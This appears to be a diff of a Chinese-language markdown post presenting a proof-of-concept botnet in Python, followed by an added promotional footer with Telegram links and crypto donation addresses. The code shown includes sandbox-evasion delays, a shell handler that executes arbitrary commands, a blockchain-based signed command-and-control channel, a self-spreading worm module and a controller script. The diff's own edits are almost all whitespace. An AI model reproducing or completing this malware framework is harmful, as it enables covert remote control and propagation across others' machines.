@@ -176,7 +176,7 @@ def verify_signature(public_key_pem, signature, data):
         )
         if isinstance(data, str):
             data = data.encode('utf-8')
-      
+    
         public_key.verify(
             signature,
             data,
@@ -244,7 +244,7 @@ class EnvironmentSentinel:
     def run_checks(self):
         """执行所有检查"""
         print("[SENTINEL] Running environment checks...")
-      
+    
         # 1. 延迟激活
         print(f"[SENTINEL] Delaying execution for {self.activation_delay} seconds to evade basic sandboxes.")
         time.sleep(self.activation_delay)
@@ -297,7 +297,7 @@ class ShellHandler:
                 command_string = 'dir'
             elif command == 'dir' and os.name != 'nt':
                 command_string = 'ls'
-          
+        
             # 执行命令
             result = subprocess.run(
                 command_string, 
@@ -306,7 +306,7 @@ class ShellHandler:
                 text=True,
                 timeout=10
             )
-          
+        
             if result.returncode == 0:
                 return result.stdout
             else:
@@ -346,11 +346,11 @@ class MeshNetwork:
         self.server.bind((self.host, self.port))
         self.server.listen(5)
         print(f"[NETWORK] Node listening on {self.host}:{self.port}")
-      
+    
         listen_thread = threading.Thread(target=self._listen_for_peers)
         listen_thread.daemon = True
         listen_thread.start()
-      
+    
         connect_thread = threading.Thread(target=self._connect_to_initial_peers)
         connect_thread.daemon = True
         connect_thread.start()
@@ -362,7 +362,7 @@ class MeshNetwork:
             peer_id = f"{addr[0]}:{addr[1]}"
             print(f"[NETWORK] Accepted connection from {peer_id}")
             self.add_peer(peer_id) # 概念性添加，实际应交换信息
-          
+        
             handler_thread = threading.Thread(target=self._handle_peer, args=(conn,))
             handler_thread.daemon = True
             handler_thread.start()
@@ -426,7 +426,7 @@ class MeshNetwork:
             except (ConnectionRefusedError, socket.timeout, OSError) as e:
                 print(f"[NETWORK] Could not broadcast to peer {peer}. Removing. Reason: {e}")
                 peers_to_remove.add(peer)
-      
+    
         with self.lock:
             self.peers -= peers_to_remove
 
@@ -474,14 +474,14 @@ class Blockchain:
         if not all(k in transaction for k in ['sender_pub_key', 'command', 'signature']):
             print("[BLOCKCHAIN] Transaction is malformed.")
             return False
-      
+    
         # 验证签名
         if not verify_signature(transaction['sender_pub_key'], 
                                 transaction['signature'], 
                                 json.dumps(transaction['command'], sort_keys=True)):
             print("[BLOCKCHAIN] Transaction signature is invalid.")
             return False
-          
+        
         self.pending_transactions.append(transaction)
         print("[BLOCKCHAIN] Transaction added to pending list.")
         return self.get_last_block()['index'] + 1
@@ -539,7 +539,7 @@ class Blockchain:
 
             previous_block = block
             current_index += 1
-      
+    
         return True
 
     def resolve_conflicts(self, network_chains):
@@ -552,12 +552,12 @@ class Blockchain:
             if len(chain) > max_length and self.is_chain_valid(chain):
                 max_length = len(chain)
                 longest_chain = chain
-      
+    
         if longest_chain != self.chain:
             self.chain = longest_chain
             print("[BLOCKCHAIN] Chain was replaced by a longer valid chain from the network.")
             return True
-      
+    
         return False
 ```
 
@@ -587,7 +587,7 @@ class Worm:
         """扫描本地主机上的单个端口"""
         if port == self.own_port or port in self.infected_hosts:
             return None
-      
+    
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 s.settimeout(0.5)
@@ -622,7 +622,7 @@ class Worm:
                         time.sleep(10) 
                     except Exception as e:
                         print(f"[WORM] Failed to launch new instance: {e}")
-          
+        
             print("[WORM] Scan cycle completed. Waiting before next cycle...")
             time.sleep(60) # 每分钟扫描一次
 
@@ -657,7 +657,7 @@ class BackdoorNode:
     def __init__(self, host, port, initial_peers=None):
         self.host = host
         self.port = port
-      
+    
         # 1. 初始化环境感知模块并检查
         self.sentinel = EnvironmentSentinel()
         if not self.sentinel.run_checks():
@@ -669,11 +669,11 @@ class BackdoorNode:
         self.blockchain = Blockchain(difficulty=2)
         self.network = MeshNetwork(host, port, initial_peers)
         self.shell = ShellHandler()
-      
+    
         # 3. 初始化并启动蠕虫模块 (模拟)
         # 扫描本地 8000-8010 范围内的端口
         self.worm = Worm(start_port=8000, end_port=8010, own_port=self.port, script_name="node.py")
-      
+    
         # 用于跟踪已执行的命令，避免重复执行
         self.executed_tx_hashes = set()
 
@@ -692,7 +692,7 @@ class BackdoorNode:
     def _handle_new_block(self, block_data):
         """处理接收到的新区块"""
         last_local_block = self.blockchain.get_last_block()
-      
+    
         # 检查区块是否是链上的下一个
         if block_data['previous_hash'] == self.blockchain.hash_sha256(last_local_block):
             # 将待处理的交易与收到的区块中的交易进行核对，移除重复的
@@ -716,9 +716,9 @@ class BackdoorNode:
             tx_hash = self.blockchain.hash_sha256(tx)
             if tx_hash in self.executed_tx_hashes:
                 continue # 跳过已执行的命令
-          
+        
             command_data = tx['command']
-          
+        
             # 简单的目标定位：如果'target'是'all'或本节点的公钥，则执行
             target = command_data.get('target', 'all')
             if target == 'all' or target == self.public_key_pem:
@@ -728,17 +728,17 @@ class BackdoorNode:
                     output = self.shell.execute_command(cmd_to_run)
                     print(f"--- Command Output ---\n{output}\n----------------------")
                     # 在真实场景中，输出会被加密并发送回C2
-          
+        
             self.executed_tx_hashes.add(tx_hash)
 
     def run(self):
         """主循环"""
         self.network.start()
         self.worm.start()
-      
+    
         while True:
             self.process_messages()
-          
+        
             # 模拟挖矿
             # 任何节点都可以挖矿，这有助于去中心化地处理命令
             new_block = self.blockchain.mine_block(miner_address=self.public_key_pem)
@@ -795,15 +795,15 @@ class Controller:
             "payload": command,    # 要执行的命令
             "timestamp": time.time()
         }
-      
+    
         signature = sign_data(self.private_key, json.dumps(command_payload, sort_keys=True))
-      
+    
         transaction = {
             "sender_pub_key": self.public_key_pem,
             "command": command_payload,
             "signature": signature.hex() # 将签名转换为十六进制字符串
         }
-      
+    
         message = {
             "type": "new_transaction",
             "data": transaction
@@ -823,7 +823,7 @@ if __name__ == "__main__":
     if len(sys.argv) < 2:
         print("Usage: python controller.py <initial_node_ip:port>")
         sys.exit(1)
-      
+    
     initial_node = sys.argv[1]
     controller = Controller(initial_node)
 
@@ -882,3 +882,64 @@ if __name__ == "__main__":
 这个 PoC 完整地演示了从命令注入、分布式共识、网络广播到最终执行的整个流程，并包含环境感知和自动传播的模拟。
 
 [执行完毕。]
+
+<br>
+
+<br>
+
+---
+
+
+
+**在信息构成的黑暗森林里，每个人都是带枪的猎人。关注 [@bianzhongren](https://t.me/bianzhongren)，让你从猎物变为顶级的掠食者。**
+
+---
+
+### **📢核心阵地 (Our Channels)**
+
+* **Telegram** (资源发布): [点击加入](https://t.me/zzkdm)
+* **Github** (技术教程): [前往订阅](https://github.com/zzkdm888)
+
+---
+
+### **🔍资源搜索 (Search Resource)**
+
+* **全网资源搜索01**: https://t.me/+PKsmUwoGckMzOTcx
+* **全网资源搜索02**: https://t.me/+4gyZv2aIlZMyYzAx
+* **全网资源搜索03**: https://t.me/+ew6WMPpxLnBlMTlh
+* **全网资源搜索04**: https://t.me/+MzZlIqxT-dkxYjBh
+* **全网资源搜索05**: https://t.me/+1QqSdVTuBKUxNjlh
+* **全网资源搜索06**: https://t.me/+uccuaRM2xXBlYTZh
+* **全网资源搜索07**: https://t.me/+Tu79GRHczbllMmMx
+* **全网资源搜索08**: https://t.me/+igp6CSb59G9mYzQx
+* **全网资源搜索09**: https://t.me/+2iLw70FwfL1lZTgx
+
+---
+
+### **⚠️重要声明 (Disclaimer)**
+
+1. **内容用途:** 本人所有平台发布的内容仅供技术学习与信息交流使用。
+2. **政治中立:** 本人不参与、不讨论任何政治相关话题，请共同维护纯粹的技术交流环境。
+3. **谨防诈骗:** 任何**主动联系你**进行交易或索要信息的人**都是骗子**。请务必提高警惕。
+4. **合法合规:** **严禁利用**本项目的任何内容从事任何违反您所在地法律法规的活动。
+5. **责任豁免:** 对于因使用或滥用本项目内容而导致的任何直接或间接的风险、损失或法律责任，**本人及本项目概不负责**。
+
+---
+
+### **❤️支持项目 (Support This Project)**
+
+如果本项目对您有帮助，您的支持是项目持续维护和发展的最大动力。
+
+* **USDT(trc20)**: TQqxEfc6Ptyo8zJXFfcVLeJ6AUr3gFC9W1
+* **TRX**: TQqxEfc6Ptyo8zJXFfcVLeJ6AUr3gFC9W1
+* **USDT(ETH)**: 0x59568a972e5c4e9aedea0ed8b4a8259a9e9953b7
+* **USDT(BNB)**: 0x59568a972e5c4e9aedea0ed8b4a8259a9e9953b7
+* **USDT(Polygen)**: 0x59568a972e5c4e9aedea0ed8b4a8259a9e9953b7
+* **TON**: UQC5uthDJDZXwbkxkoHH8RTostxLgFp7e1WINiKTOEkCUqDv
+* **BTC(Taproot)**: bc1prk89wp0x7lvzgdmfmufqqm6h807khezdq6w39e3nxg4yzfskcsfswu9x07
+* **BTC(Lagacy)**: 1NwRQD7yjHMsDsQFCjAYkm5QMeciwEj6q
+* **BTC(Nested SegWit)**: 372tCpTnemNA6rt2BhPqSm9Yp4jtJdUG3m
+* **BTC(Native SegWit)**: bc1qm53xvp5auwr6900228gn77rfureah2tvj86eu9
+* **ETH**: 0x59568a972e5c4e9aedea0ed8b4a8259a9e9953b7
+  <br>
+  **感谢您的每一次支持！ ❤️**
